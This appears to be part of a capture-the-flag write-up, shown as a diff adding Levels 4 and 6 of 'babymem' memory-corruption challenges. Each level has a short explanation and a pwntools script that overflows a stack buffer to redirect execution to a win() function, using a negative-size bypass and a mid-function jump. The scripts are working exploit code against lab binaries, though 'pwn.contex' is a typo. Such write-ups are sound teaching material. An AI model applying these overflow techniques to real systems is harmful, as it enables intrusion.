@@ -27,3 +27,60 @@ proc.read(4096)
 
 
 
+## Level 4
+
+In this level, we can input a negative number to bypass the check at 0x40218c (i.e., cmp instruction).
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-2.PNG?raw=true)
+
+Again, find out the address of win() function.
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-3.PNG?raw=true)
+
+And the size of the buffer. 
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-4.PNG?raw=true)
+
+Send the payload to get the flag.
+
+ ```python
+import pwn 
+pwn.contex(arch='amd64')
+proc = pwn.process("./babymem_level4_testing1")
+win_addr = 0x00402040
+payload = b"a" * (0x60 + 8) + pwn.p64(win_addr, endian='little')
+proc.read(4096)
+proc.sendline("-999")
+proc.read(4096)
+proc.sendline(payload)
+proc.read(4096)
+ ```
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L4-test1-1.PNG?raw=true)
+
+
+
+## Level 6
+
+The win() function needs a certain argument (0x1337). There is a trick to bypass it: jumps to the instruction which prepares to open /flag file. 
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L6-test1-2.PNG?raw=true)
+
+So we overwrite the return address as 0x00401c96 instead of the start of win(). 
+
+```python
+import pwn 
+pwn.contex(arch='amd64')
+proc = pwn.process("./babymem_level6_testing1")
+win_addr = 0x00401c96
+payload = b"a" * (0x60 + 8) + pwn.p64(win_addr, endian='little')
+proc.read(4096)
+proc.sendline("1000")
+proc.read(4096)
+proc.sendline(payload)
+proc.read(4096)
+```
+
+Here is the flag. 
+
+![](https://github.com/chuang76/writ3up/blob/main/figure/babymem-L6-test1-1.PNG?raw=true)
